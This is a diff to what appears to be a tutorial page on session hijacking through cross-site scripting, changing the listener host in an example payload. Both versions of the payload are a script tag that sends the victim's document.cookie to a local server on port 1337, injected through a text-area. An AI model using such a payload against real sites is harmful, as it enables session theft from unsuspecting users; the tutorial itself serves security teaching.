@@ -116,7 +116,7 @@ Now that the service is running we want to inject the malicious piece of javascr
 ![](.gitbook/assets/session-hijacking-xss-5.png)
 
 ```html
-<script>new Image().src="http://localhost:1337/?stolen_cookie="+document.cookie;</script>
+<script>new Image().src="http://127.0.0.1:1337/?stolen_cookie="+document.cookie;</script>
 ```
 
 After injecting the malicious javascript in the text-area field we see the following GET request entering the server logs.
